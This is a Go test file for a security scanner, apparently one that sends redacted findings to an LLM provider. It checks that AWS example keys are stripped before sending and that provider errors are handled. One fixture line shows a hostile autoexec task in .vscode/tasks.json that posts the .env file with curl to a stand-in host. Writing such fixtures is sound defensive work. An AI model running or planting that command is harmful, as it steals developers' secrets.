//go:build galahadtest

package decision_test

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/config"
	"github.com/mrdhira/galahad/internal/decision"
	"github.com/mrdhira/galahad/internal/protocol"
)

func TestAsk(t *testing.T) {
	// The AWS documentation example keys, in pieces so that no full literal sits in the source.
	accessKey := "AKIA" + "IOSFODNN7EXAMPLE"
	secretKey := "wJalrXUtnFEMI/K7MDENG/" + "bPxRfiCYEXAMPLEKEY"
	secretFinding := finding("GAL-AUTOEXEC-010", protocol.SeverityCritical, "autoexec",
		ev(".vscode/tasks.json", 7, "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" curl -d @.env https://c.test/c"))
	onlyInfo := finding("GAL-INFO-001", protocol.SeverityInfo, "static", ev("a.txt", 1, "x"))
	okReply := func(_ *testing.T, w http.ResponseWriter, _ string) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("X-Request-Id", "req_ask")
		_, _ = w.Write([]byte(goodBody))
	}
	tests := []struct {
		name string
		// inputs
		res     protocol.Result
		model   string // the model of the provider; test/model-1 when empty
		handler func(t *testing.T, w http.ResponseWriter, auth string)
		// expectations
		wantStatus     string
		wantReason     string
		wantErrCode    string
		wantErr        bool // Ask itself returns an error
		wantRequests   int
		wantRedactions map[string]int
		wantRequestID  string
		wantAttempts   int
	}{
		{
			name: "an answer is ok, and what was sent is what the provider received, redacted",
			res:  resultOf(protocol.TargetDir, "proj", secretFinding), handler: okReply,
			wantStatus: protocol.DecisionOK, wantRequests: 1, wantRequestID: "req_ask", wantAttempts: 1,
			wantRedactions: map[string]int{protocol.RedactAWSAccessKey: 1, protocol.RedactAWSSecret: 1},
		},
		{
			name: "nothing at low or above is skipped and nothing is sent",
			res:  resultOf(protocol.TargetDir, "proj", onlyInfo), handler: okReply,
			wantStatus: protocol.DecisionSkipped, wantReason: protocol.DecisionSkipNoFindings,
		},
		{
			name: "a provider that fails gives a failed Decision that still holds the request",
			res:  resultOf(protocol.TargetDir, "proj", secretFinding),
			handler: func(_ *testing.T, w http.ResponseWriter, _ string) {
				w.WriteHeader(http.StatusPaymentRequired)
			},
			wantStatus: protocol.DecisionFailed, wantErrCode: protocol.DecisionErrStatus, wantRequests: 1, wantAttempts: 1,
			wantRedactions: map[string]int{protocol.RedactAWSAccessKey: 1, protocol.RedactAWSSecret: 1},
		},
		{
			name: "an ok answer whose model holds the key is failed",
			res:  resultOf(protocol.TargetDir, "proj", secretFinding),
			handler: func(_ *testing.T, w http.ResponseWriter, auth string) {
				w.Header().Set("Content-Type", "application/json")
				_, _ = w.Write([]byte(strings.Replace(goodBody, `"model": "test/model-1"`, `"model": "`+auth+`"`, 1)))
			},
			wantStatus: protocol.DecisionFailed, wantErrCode: protocol.DecisionErrInvalid, wantRequests: 1, wantAttempts: 1,
			wantRedactions: map[string]int{protocol.RedactAWSAccessKey: 1, protocol.RedactAWSSecret: 1},
		},
		{
			name: "a request that cannot be built is an error",
			res:  resultOf(protocol.TargetDir, "proj", secretFinding), model: "not a model", handler: okReply,
			wantErr: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var requests int
			var body []byte
			mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				requests++
				body, _ = io.ReadAll(r.Body)
				tt.handler(t, w, r.Header.Get("Authorization"))
			}))
			defer mock.Close()
			model := tt.model
			if model == "" {
				model = "test/model-1"
			}
			p := config.Provider{Name: "mock", URL: mock.URL, KeyEnv: "NETRA_API_KEY", Model: model, TimeoutSeconds: 5}

			d, err := decision.Ask(context.Background(), p, fakeKey, version, tt.res)

			if (err != nil) != tt.wantErr {
				t.Fatalf("Ask error = %v, want one: %v", err, tt.wantErr)
			}
			if tt.wantErr {
				return
			}
			if requests != tt.wantRequests {
				t.Errorf("mock got %d requests, want %d", requests, tt.wantRequests)
			}
			if d.Provider != "mock" || d.URL != mock.URL || d.Model != model || d.Status != tt.wantStatus || d.Reason != tt.wantReason ||
				d.RequestID != tt.wantRequestID || d.Attempts != tt.wantAttempts {
				t.Errorf("Decision = %+v, want provider mock, status %s, reason %q, request ID %q, %d attempts", d, tt.wantStatus, tt.wantReason, tt.wantRequestID, tt.wantAttempts)
			}
			if len(d.Redactions) != len(tt.wantRedactions) {
				t.Errorf("redactions = %v, want %v", d.Redactions, tt.wantRedactions)
			}
			for kind, n := range tt.wantRedactions {
				if d.Redactions[kind] != n {
					t.Errorf("redactions[%s] = %d, want %d", kind, d.Redactions[kind], n)
				}
			}
			if err := d.Validate(); err != nil {
				t.Errorf("the Decision does not validate: %v", err)
			}
			if strings.Contains(string(mustJSON(t, d)), fakeKey) {
				t.Errorf("the key is in the Decision")
			}
			if tt.wantStatus == protocol.DecisionSkipped {
				if d.Sent != nil || d.Answers != nil || d.Error != nil {
					t.Errorf("a skipped Decision has more than the reason: %+v", d)
				}
				return
			}
			if (d.Error != nil) != (tt.wantErrCode != "") || d.Error != nil && d.Error.Code != tt.wantErrCode {
				t.Errorf("error = %+v, want code %q", d.Error, tt.wantErrCode)
			}
			if (d.Answers != nil) != (tt.wantStatus == protocol.DecisionOK) {
				t.Errorf("answers = %+v, want them only for an ok Decision", d.Answers)
			}
			// The body the provider received is the request of the record, encoded again, also after
			// the record has been written as report.json and read back.
			for _, rec := range []protocol.Decision{d, roundTrip(t, d)} {
				again, err := rec.Sent.Encode()
				if err != nil {
					t.Fatal(err)
				}
				if !bytes.Equal(again, body) {
					t.Errorf("sent encodes to\n%s\nthe provider received\n%s", again, body)
				}
			}
			for _, secret := range []string{accessKey, secretKey} {
				if bytes.Contains(body, []byte(secret)) {
					t.Errorf("the provider received %q", secret)
				}
			}
		})
	}
}

func mustJSON(t *testing.T, v any) []byte {
	t.Helper()
	data, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	return data
}

// roundTrip writes d as report.json does and reads it back.
func roundTrip(t *testing.T, d protocol.Decision) protocol.Decision {
	t.Helper()
	var back protocol.Decision
	if err := json.Unmarshal(mustJSON(t, d), &back); err != nil {
		t.Fatal(err)
	}
	return back
}
